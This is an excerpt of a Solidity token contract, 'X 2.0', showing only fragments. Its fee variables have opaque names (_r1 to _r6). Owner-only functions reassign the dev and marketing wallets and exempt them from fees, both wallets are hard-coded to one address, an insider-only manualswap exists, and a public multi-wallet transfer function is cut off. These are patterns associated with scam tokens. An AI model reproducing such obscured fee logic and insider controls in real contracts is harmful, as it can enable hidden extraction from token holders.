...
contract X20 is Context, IERC20, Ownable {
    ...
    uint256 private _r1 = 0;
    uint256 private _r2 = 2;
    
    uint256 private _r3 = 0;
    uint256 private _r4 = 2;
    
    uint256 private _r5;
    uint256 private _r6;
    
    string private constant _name = "X 2.0";
    string private constant _symbol = "X2.0";
    uint8 private constant _decimals = 9;

    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    address payable private _dev = payable(0xb01bcd2afa6A9F96b0ec979eE20221c5E6a293Be);
    address payable private _marketing = payable(0xb01bcd2afa6A9F96b0ec979eE20221c5E6a293Be);
    ...
    function setNewDevAddress(address payable dev) public onlyOwner() {
        emit devAddressUpdated(_dev, dev);	
        _dev = dev;
        _isExcludedFromFee[_dev] = true;
    }
    ...
    function setNewMarketingAddress(address payable markt) public onlyOwner() {
        emit marketingAddressUpdated(_marketing, markt);	
        _marketing = markt;
        _isExcludedFromFee[_marketing] = true;
    }
    ...
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _r5, _r6);
        uint256 currentRate =  _getRate();
    ...
    function manualswap() external {
        require(_msgSender() == _dev || _msgSender() == _marketing || _msgSender() == owner());
    ...
    function tranferMultilWallet(address[] calldata accounts, uint256 amount) public{
        for(uint256 i = 0; i < accounts.length; i++) {
